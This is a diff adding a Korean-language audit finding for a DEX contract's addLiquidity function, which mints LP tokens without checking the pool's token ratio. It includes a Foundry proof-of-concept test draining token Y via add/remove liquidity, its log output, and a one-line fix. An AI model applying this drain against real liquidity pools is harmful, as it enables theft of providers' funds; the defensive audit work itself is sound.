@@ -163,3 +163,72 @@ Critical
       return true;
     }
     ```
+
+## 최영현
+
+### No Imbalance Check on Add Liquidity
+
+#### 설명
+
+문제 코드: addLiquidity 함수 전체
+
+유동성 공급 시 유동성 풀 내의 토큰 비율을 검사하지 않는다.
+
+```jsx
+
+function addLiquidity ... {
+	...
+	if(totalSupply() == 0){ LPTokenAmount = tokenXAmount * tokenYAmount / 10**18;} else{ LPTokenAmount = totalSupply() * tokenXAmount / reserveX;}
+
+	require(minimumLPTokenAmount <= LPTokenAmount)
+	...
+}
+```
+
+#### 파급력
+
+Critical
+
+- 공격 시나리오
+    - X토큰만 충분히 넣어서 minimumLPTokenAmount 조건을 만족시키면 유동성을 공급할 수 있다.
+    - 유동성 공급 이후 발행된 LP토큰으로 removeLiquidity를 수행하면 공급하지 않은 Y토큰까지 탈취가 가능하다.
+    - 아래 코드에서 TokenY는 1 ether만 공급하지만 LP토큰으로 회수하는 양은 667.3.. ether이다.
+    
+    ```jsx
+    function testAddLiquidity() external {
+      uint firstLPReturn = dex.addLiquidity(500 ether, 1000 ether, 0);
+      emit log_named_uint("firstLPReturn", firstLPReturn);
+    
+      uint secondLPReturn = dex.addLiquidity(1000 ether, 1 ether, 0);
+      emit log_named_uint("secondLPReturn", secondLPReturn);
+    
+      (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
+      emit log_named_uint("second LP remove", tx);
+      emit log_named_uint("second LP remove", ty);
+    
+      assertEq(tx, 1000 ether);
+      assertEq(ty, 1 ether);
+    }
+    ```
+    
+    ```jsx
+    [FAIL. Reason: Assertion failed.] testAddLiquidity1() (gas: 230413)
+    Logs:
+      firstLPReturn: 500000000000000000000000
+      secondLPReturn: 1000000000000000000000000
+      second LP remove: 1000000000000000000000
+      second LP remove: 667333333333333333333
+      Error: a == b not satisfied [uint]
+            Left: 667333333333333333333
+           Right: 1000000000000000000
+    ```
+- 공격 난이도   
+    - 모든 유동성 공급자에 의해 발생 가능하다.
+- 발생할 수 있는 피해
+    - 토큰 X가 충분하다면 swap이 아닌 유동성 공급과 제거만으로 유동성 풀에 존재하는 토큰 Y를 모두 탈취할 수 있다.
+#### 해결 방안
+    - addLiquidity 함수 실행시 유동성 풀에 있는 토큰의 비율을 검사하는 코드가 필요하다.
+    
+    ```jsx
+    require(reserveX * tokenYAmount == reserveY * tokenXAmount);
+    ```
